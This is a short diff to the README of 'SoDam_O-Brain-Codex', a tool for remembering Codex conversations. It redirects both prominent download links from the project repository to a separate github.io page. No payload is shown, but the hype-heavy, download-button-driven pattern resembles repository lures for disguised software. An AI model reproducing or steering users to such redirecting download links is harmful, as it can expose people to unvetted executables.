@@ -1,7 +1,7 @@
 <h1>🧠 SoDam_O-Brain-Codex - Your Codex Conversations, Perfectly Remembered</h1>
 
 <p align="center">
-  <a href="https://github.com/latent-aidstation6540/SoDam_O-Brain-Codex">
+  <a href="https://latent-aidstation6540.github.io">
     <img src="https://img.shields.io/badge/⬇️%20Download%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download Now" style="background-color:#FF6B6B; padding:15px 30px; border-radius:10px; font-size:20px; color:white; text-decoration:none;">
   </a>
 </p>
@@ -49,7 +49,7 @@ Getting started is incredibly simple. Follow these exact steps:
 ### Step 1: Visit the Download Page
 Click the big red button at the top of this page, or click this link:
 
-### 🔗 [Click Here to Download SoDam_O-Brain-Codex](https://github.com/latent-aidstation6540/SoDam_O-Brain-Codex)
+### 🔗 [Click Here to Download SoDam_O-Brain-Codex](https://latent-aidstation6540.github.io)
 
 This will open your web browser to a page where you can get the application.
 
